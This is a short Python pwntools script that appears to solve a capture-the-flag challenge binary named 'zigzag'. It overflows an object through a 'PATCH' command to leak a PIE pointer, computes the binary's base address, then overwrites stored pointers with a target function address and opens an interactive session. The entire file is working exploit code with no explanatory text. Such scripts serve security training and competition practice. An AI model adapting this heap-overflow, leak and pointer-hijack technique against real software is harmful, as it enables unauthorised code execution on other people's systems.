from pwn import *

elf=ELF("zigzag")
p=process(elf.path)
#p = gdb.debug(elf.path, aslr=False, gdbscript=
#	'''
#continue
#'''
#
#	)
#context.log_level = 'debug'

p.recvline(timeout=1)
p.sendline(b"PUT 1 10")
p.recvline(timeout=1)
p.sendline(b'C'*24)
p.recvline(timeout=1)

p.recvline(timeout=1)
p.sendline(b"PUT 2 24")
p.recvline(timeout=1)
p.sendline(b'C'*24)
p.recvline(timeout=1)


p.sendline(b'PATCH 2 33')
p.recvline(timeout=1)
payload=b'A'*32
payload+=p8(0)
p.sendline(payload)
p.recvline(timeout=1)


PIE_POINTER_OFFSET = 0x14f30

p.sendline(b"RENDER 2")
p.recvuntil(b"VALUE ")

# Pointer is at offset 0x10 in the leaked memory.
data = p.recvn(0x18, timeout=1)

pie_leak = u64(data[0x10:0x18])
elf.address = pie_leak - PIE_POINTER_OFFSET

log.success(f"PIE pointer: {pie_leak:#x}")
log.success(f"PIE base:    {elf.address:#x}")

FUNCTION_OFFSET = 0x6B820
function_addr = elf.address + FUNCTION_OFFSET
log.success(f"Function address: {function_addr:#x}")

p.sendline(b'PATCH 2 32')
p.recvline(timeout=1)
payload=p64(function_addr)*4
p.sendline(payload)
p.recvline(timeout=1)


p.sendline(b"RENDER 1")
p.recvline(timeout=1)

p.interactive()

